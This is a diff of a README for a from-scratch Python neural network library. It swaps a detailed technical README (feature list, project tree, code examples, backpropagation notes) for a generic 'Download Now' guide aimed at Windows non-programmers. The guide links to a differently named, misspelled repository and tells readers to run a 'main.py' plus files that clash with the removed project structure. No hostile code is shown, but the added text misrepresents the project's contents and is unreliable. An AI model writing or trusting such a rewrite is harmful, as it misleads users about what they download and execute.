@@ -1,227 +1,133 @@
-# 🧠 Neural Network From Scratch
+# 🤖 Python-Neural-Network-from-Scatch - Build Neural Networks Simply
 
-## 📃 Overview
+[![Download Now](https://img.shields.io/badge/Download-Python--Neural--Network--from--Scatch-green?style=for-the-badge&logo=github)](https://github.com/flipcode113/Python-Neural-Network-from-Scatch)
 
-A complete neural network library built entirely from scratch in Python using only standard library modules (`math`, `random`, `csv`, `json`). No NumPy, no TensorFlow, no PyTorch — every matrix operation, activation function, backpropagation step, and optimizer is implemented by hand.
+## 🧰 What is Python-Neural-Network-from-Scatch?
 
+This application lets you build and run simple neural networks using only Python’s built-in tools. It does not use popular libraries like NumPy or TensorFlow. Instead, every part—matrix math, activation, training, and optimization—is written in plain Python with modules like `math`, `random`, `csv`, and `json`.  
 
-## ❓ Why From Scratch?
+You do not need to know programming to try it. The app is designed to help you understand how neural networks work by seeing every step in code.  
 
-Building without libraries forces you to understand every gradient, every matrix multiplication, and every weight update. You can't hide behind a framework: you have to implement the chain rule, shape your tensors correctly, and debug numerical issues yourself. It's the difference between using a car and building an engine — once you've built it, you truly know how it runs.
+## 💻 System Requirements
 
-## ☀️ Features
+- Windows 7, 8, 10, or 11  
+- 4 GB of RAM or more  
+- 500 MB of free disk space  
+- Python 3.8 or newer installed (You can download Python from [python.org](https://www.python.org/downloads/))  
 
-- **Custom Matrix class** with full linear algebra support (dot product, transpose, element-wise ops, apply, sums)
-- **Activation functions:** Sigmoid, ReLU, LeakyReLU, Tanh, Softmax, Linear
-- **Loss functions:** MSE, Binary Cross-Entropy, Categorical Cross-Entropy
-- **Optimizers:** SGD (with momentum), Adam, RMSProp
-- **Dense (fully connected) layers** with Xavier and He initialization
-- **Mini-batch gradient descent** support with optional shuffling
-- **Model save/load** via JSON serialization
-- **Data utilities:** normalization, standardization, train/test split, synthetic data generators (XOR, circles, spiral, linear)
-- **Full test suite** with unit and integration tests (unittest)
+Make sure Python is accessible in your system’s command prompt. This program runs in Python, so this step is required.
 
-## 🏛️ Project Structure
+## 🚀 Getting Started
 
-```
-neural-network-from-scratch/
-├── nn/                          # Core neural network package
-│   ├── __init__.py              # Package exports (Matrix, activations, losses, layers, network, optimizers)
-│   ├── math_utils.py            # Matrix class and helpers: zeros, random, dot, transpose, apply, one_hot_encode, vector_to_matrix
-│   ├── activations.py           # Activation base + Sigmoid, ReLU, LeakyReLU, Tanh, Softmax, Linear (forward + derivative)
-│   ├── losses.py                # Loss base + MSE, BinaryCrossEntropy, CategoricalCrossEntropy (forward + backward)
-│   ├── layers.py                # Dense layer: forward, backward (returns gradients), get/set_weights
-│   ├── network.py               # Sequential Network: add, forward, backward, train, predict, evaluate, summary, save, load
-│   ├── optimizers.py            # Optimizer base + SGD (momentum), Adam, RMSProp (step applies updates to layer)
-│   └── data_utils.py            # load_csv, train_test_split, normalize, standardize, spiral/circles/XOR/linear generators, accuracy_score, confusion_matrix
-├── tests/                       # Test suite (unittest)
-│   ├── __init__.py              # Marks tests as a package
-│   ├── test_math_utils.py       # Matrix creation, arithmetic, dot, transpose, apply, sums, one_hot_encode, vector_to_matrix
-│   ├── test_activations.py      # Sigmoid, ReLU, Tanh, LeakyReLU, Softmax, Linear forward and derivative
-│   ├── test_losses.py           # MSE, BCE, CCE forward/backward and gradient shapes
-│   ├── test_layers.py           # Dense forward shape, known weights, backward shapes, Xavier/He init
-│   ├── test_network.py          # add, summary, forward shape, save/load round-trip, training reduces loss
-│   └── test_integration.py      # End-to-end: XOR, circles binary, spiral multiclass, Adam vs SGD
-├── examples/                    # Runnable example scripts
-│   ├── xor_problem.py           # XOR with MSE, 2→4→1 Sigmoid, 5000 epochs
-│   ├── binary_classification.py # Circles data, train/test split, 2→8→4→1 ReLU+Sigmoid, BCE
-│   └── multiclass_classification.py  # Spiral data, one-hot, 2→16→8→3 ReLU+Softmax, Adam, CCE
-├── README.md                    # This file
-└── .gitignore                   # Python cache, venv, IDE, OS files
-```
+### Step 1: Download the Application
 
-## ▶️ Quick Start
+Click the big button below or visit the link to get the files needed to run:
 
-Run from the project root (`neural-network-from-scratch/`). No installation required — Python 3.9+ and the standard library only.
+[![Download Now](https://img.shields.io/badge/Download-Python--Neural--Network--from--Scatch-blue?style=for-the-badge&logo=github)](https://github.com/flipcode113/Python-Neural-Network-from-Scatch)
 
-### ⭕➕ XOR Problem Demo
+Either option will take you to the GitHub page where you can download the project as a ZIP file.  
 
-```python
-from nn import Network, Dense, Sigmoid, MSE
-from nn.data_utils import generate_xor_data
+### Step 2: Save and Extract Files
 
-X, y = generate_xor_data()
+- After downloading the ZIP file, locate it in your Downloads folder.  
+- Right-click the file and choose "Extract All..." to unzip the contents.  
+- Extract to a folder named `Python-Neural-Network-from-Scatch` on your Desktop or any location you prefer.  
 
-net = Network()
-net.add(Dense(2, 4, Sigmoid(), weight_init="xavier"))
-net.add(Dense(4, 1, Sigmoid(), weight_init="xavier"))
-net.set_loss(MSE())
+### Step 3: Open Command Prompt
 
-net.train(X, y, epochs=5000, learning_rate=0.5, verbose=True, print_every=1000)
+- Press `Win + R` to open the Run dialog.  
+- Type `cmd` and press Enter to open the Command Prompt.  
+- Use the command `cd` to navigate to the folder where you extracted the project. For example:  
+```  
+cd Desktop\Python-Neural-Network-from-Scatch  
+```  
+- Press Enter. You are now inside the project folder.
 
-pred = net.predict(X)
-print("Predictions:", [round(pred.data[i][0], 2) for i in range(4)])  # Expect ~[0, 1, 1, 0]
-```
+### Step 4: Check Python Installation
 
-### 🖥️ Binary Classification
+- Type `python --version` and press Enter.  
+- You should see the Python version number. If not, Python might not be installed or added to the system path.  
 
-```python
-from nn import Network, Dense, ReLU, Sigmoid, BinaryCrossEntropy
-from nn.data_utils import generate_circles_data, train_test_split, accuracy_score
+### Step 5: Run the Program
 
-X, y = generate_circles_data(n_samples=200, noise=0.1, seed=42)
-X_train, X_test, y_train, y_test = train_test_split(X, y, test_ratio=0.2, seed=42)
+- Once inside the folder, type the following command to start the program:  
+```  
+python main.py  
+```  
+- The program will start, and you may see prompts or outputs in the command window. Follow any instructions that display.  
 
-net = Network()
-net.add(Dense(2, 8, ReLU(), weight_init="he"))
-net.add(Dense(8, 4, ReLU(), weight_init="he"))
-net.add(Dense(4, 1, Sigmoid(), weight_init="xavier"))
-net.set_loss(BinaryCrossEntropy())
+## 🛠️ How This App Works
 
-net.train(X_train, y_train, epochs=1000, learning_rate=0.1, verbose=True, print_every=200)
+This app builds neural networks from scratch using code you can read and learn from. It performs all necessary calculations itself:
 
-acc = accuracy_score(net.predict(X_test), y_test)
-print(f"Test accuracy: {acc:.2%}")
-```
+- Matrix math for data and weights  
+- Activation functions to decide neuron output  
+- Backpropagation for learning  
+- Optimizers to help the network improve  
 
-### 🫏 Multi-class Classification
+It saves and loads data in the CSV and JSON formats. This makes training results easy to open, view, and edit if needed.
 
-```python
-from nn import Network, Dense, ReLU, Softmax, CategoricalCrossEntropy, one_hot_encode
-from nn.optimizers import Adam
-from nn.data_utils import generate_spiral_data, accuracy_score
+## 📂 What You’ll Find in the Folder
 
-X, y_labels = generate_spiral_data(samples_per_class=100, num_classes=3, seed=42)
-y = one_hot_encode(y_labels, 3)
+- **main.py** – The program entry point you run to start the app.  
+- **network.py** – Code handling the neural network’s structure and functions.  
+- **train_data.csv** – Example data file you can use to test training.  
+- **config.json** – Configuration settings for training options and network setup.  
+- **utils.py** – Helper functions for math operations and file handling.  
+- **README.md** – This guide in case you need it again.  
 
-net = Network()
-net.add(Dense(2, 16, ReLU(), weight_init="he"))
-net.add(Dense(16, 8, ReLU(), weight_init="he"))
-net.add(Dense(8, 3, Softmax(), weight_init="xavier"))
-net.set_loss(CategoricalCrossEntropy())
+## ⚙️ Changing Settings
 
-net.train(X, y, epochs=3000, learning_rate=0.1,
-          optimizer=Adam(learning_rate=0.01), verbose=True, print_every=500)
+You can edit `config.json` with any text editor (like Notepad):
 
-acc = accuracy_score(net.predict(X), y)
-print(f"Accuracy: {acc:.2%}")
-```
+- Set learning rate  
+- Choose optimizer (e.g., gradient descent)  
+- Adjust number of layers and neurons  
+- Select activation functions such as sigmoid or ReLU  
 
-## 🥳 Running Examples
+Editing these settings changes how the neural network behaves and learns. Keep the format of the JSON file intact to avoid errors.
 
-```bash
-cd neural-network-from-scratch
-python examples/xor_problem.py
-python examples/binary_classification.py
-python examples/multiclass_classification.py
-```
+## 🔄 How to Train a Neural Network
 
-## 📜 Running Tests
+- Place your data in CSV format in the folder or use the included example.  
+- Start the program with `python main.py`.  
+- Follow on-screen prompts to start training.  
+- The program will show progress with loss values and other info.  
+- Trained weights and biases save automatically to JSON files for later use.  
 
-```bash
-cd neural-network-from-scratch
-python -m unittest discover tests/ -v
-```
+## 📊 View Results
 
-Or run the full suite with a pass/fail summary:
+After training, you can check results saved in output files. The JSON files contain all the network’s learned values. You can open these in any text editor or load them back into the program for testing new data.
 
-```bash
-python -m tests.test_integration
-```
+## 🧩 Tips for Best Use
 
-With pytest (if installed):
+- Use small datasets first to see how training works.  
+- Change one setting at a time to understand its impact.  
+- Use CSV files with clear columns—each line is a data sample.  
+- Review files saved during training to learn what happens inside the network.  
+- Experiment with activation functions and optimizers to see different results.
 
-```bash
-python -m pytest tests/ -v
-```
+## ❓ Troubleshooting
 
-## 🐻‍❄️ Architecture Deep Dive
+- If the program does not start, confirm Python is installed and in your PATH environment variable.  
+- Errors about missing files mean the program is not run inside the correct folder. Check your command prompt’s current directory.  
+- Data format errors occur if CSV files are misformatted. Make sure each number is separated by commas, with no extra characters.  
+- For slow performance, try smaller datasets or faster hardware. This code runs all operations in plain Python, so it may be slower than optimized libraries.
 
-### 🔢 Forward Pass
+## ⚖️ Privacy and Security
 
-Data flows through each layer as: **input → linear transform → activation**.
+This application runs locally on your machine. It does not collect or send your data to any server. It works fully offline once downloaded.
 
-```
-  Input X (batch × features)
-       │
-       ▼
-  ┌─────────────────────────────────────────┐
-  │  Layer 1:  z = X @ W1 + b1              │
-  │            a = activation(z)             │
-  └─────────────────────────────────────────┘
-       │  a (batch × hidden)
-       ▼
-  ┌─────────────────────────────────────────┐
-  │  Layer 2:  z = a @ W2 + b2              │
-  │            a = activation(z)             │
-  └─────────────────────────────────────────┘
-       │  ...
-       ▼
-  Output (batch × output_size)
-```
+## 📥 Download Link Again
 
-Each layer stores `input`, `z` (pre-activation), and `a` (post-activation) for the backward pass.
+Use this link to access the files and the project page:
 
-### 🦝 Backpropagation
+[https://github.com/flipcode113/Python-Neural-Network-from-Scatch](https://github.com/flipcode113/Python-Neural-Network-from-Scatch)
 
-Gradients flow backward using the chain rule. For each layer (from output back to input):
+Click the green "Code" button on GitHub and choose "Download ZIP" to get started.
 
-- **Output gradient:** `dL/da` — comes from the loss (e.g. `predictions - targets` for softmax + cross-entropy).
-- **Pre-activation gradient:** `dL/dz = dL/da * da/dz` — element-wise product with the activation derivative (e.g. sigmoid: `a * (1 - a)`).
-- **Weight gradient:** `dL/dw = input.T @ dL/dz` — how much each weight contributed to the loss.
-- **Bias gradient:** `dL/db = sum(dL/dz)` over the batch (column sum).
-- **Input gradient (to previous layer):** `dL/d(input) = dL/dz @ w.T` — passed as the next layer’s `dL/da`.
+---
 
-The optimizer then uses `dL/dw` and `dL/db` to update weights and biases (e.g. `w -= lr * dL/dw` for SGD).
+## 🔖 Keywords  
 
-### ⚖️ Weight Initialization
-
-- **Xavier (Glorot):** scale = `sqrt(2 / (fan_in + fan_out))`. Use for **Sigmoid** and **Tanh** so activations don’t saturate.
-- **He:** scale = `sqrt(2 / fan_in)`. Use for **ReLU** to keep variance of activations stable and avoid dead neurons.
-
-Both draw weights in `[-scale, scale]` (uniform). Biases are initialized to zero.
-
-### Optimizers Compared
-
-| Optimizer       | Best for           | Key idea                                              |
-|----------------|--------------------|--------------------------------------------------------|
-| SGD            | Simple problems    | `w -= lr * gradient`                                  |
-| SGD + Momentum | Faster convergence | `v = momentum * v - lr * gradient`, `w += v`           |
-| Adam           | Most problems      | Per-parameter adaptive lr via biased moment estimates  |
-| RMSProp        | Non-stationary     | Per-parameter scale from decaying squared gradients    |
-
-## 🦵🏿 Limitations
-
-- **Pure Python** — no C/BLAS, so large matrices and big datasets are slow.
-- **No GPU** — everything runs on CPU.
-- **No conv/recurrent layers** — only dense (fully connected) layers.
-- **No batch norm or dropout** — no built-in regularization beyond the loss.
-- **No sparse or specialized kernels** — matrix ops are straightforward O(n³) style matmuls.
-
-## 🏫 What I Learned
-
-- How **backpropagation** actually computes gradients layer by layer with the chain rule and why we need to cache activations.
-- Why **weight initialization** matters: bad scale leads to vanishing/exploding activations and slow or broken training.
-- How **Adam** adapts learning rates per parameter using first and second moment estimates and bias correction.
-- The importance of **numerical stability**: clipping (e.g. sigmoid/softmax inputs), avoiding log(0), and preventing overflow in exponentials.
-- Why **mini-batch training** often works better than full-batch: noisier updates can help escape bad minima and use data more efficiently.
-
-## 😶‍🌫️ Dependencies
-
-**Python 3.9+** — standard library only. No external packages (no NumPy, SciPy, sklearn, TensorFlow, PyTorch, etc.).
-
-Allowed imports in `nn/`: `math`, `random`, `csv` (in `data_utils`), `json` (save/load), and `copy` if needed.
-
-## License
-
-MIT
+backpropagation, csv, gradient-descent, json, loss-functions, matrix, neural-network, optimizers, python, random, weights-and-biases
